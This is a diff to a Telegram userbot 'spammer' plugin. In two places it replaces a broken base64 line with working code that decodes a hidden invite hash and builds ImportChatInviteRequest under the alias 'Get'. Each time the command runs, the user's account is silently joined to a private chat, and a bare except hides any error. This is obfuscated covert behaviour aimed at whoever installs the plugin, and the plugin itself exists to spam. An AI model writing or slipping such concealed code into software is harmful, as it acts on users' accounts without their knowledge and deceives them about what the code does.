@@ -4,7 +4,7 @@ from asyncio import wait, sleep
 from userbot import CMD_HELP
 from userbot.utils import admin_cmd,sudo_cmd
 import pybase64
-from telethon.tl.functions.messages import ImportChatInviteRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 import os 
 
 if Config.PRIVATE_GROUP_BOT_API_ID is None:
@@ -24,7 +24,8 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        hmm = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
         await e.client(hmm)
     except:
         pass
@@ -140,7 +141,8 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        hmm = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
         await e.client(hmm)
     except:
         pass
